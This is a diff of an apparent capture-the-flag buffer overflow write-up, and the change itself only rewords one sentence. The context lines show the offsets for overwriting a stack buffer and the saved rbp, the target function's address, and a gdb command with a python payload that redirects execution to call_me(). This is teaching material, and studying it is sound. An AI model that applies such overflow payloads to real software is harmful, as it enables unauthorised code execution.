@@ -151,7 +151,7 @@ Non-debugging symbols:
 0x000000000040118a  call_me
 ```
 
-The address is : `0x000000000040118a`. Let's rewrite our payload, we'll need to input 64 characters to write over local_48, 8 characters to write over the rbp, and then give a pointer to the call_me() function (in reverse since we're on a [little endian system](https://en.wikipedia.org/wiki/Endianness)) :
+The address is : `0x000000000040118a`. Let's rewrite our payload, we'll need to input 64 characters to write over local_48, 8 characters to write over the rbp, and then the pointer to the call_me() function (in reverse since we're on a [little endian system](https://en.wikipedia.org/wiki/Endianness)) :
 
 ```gdb
 (gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
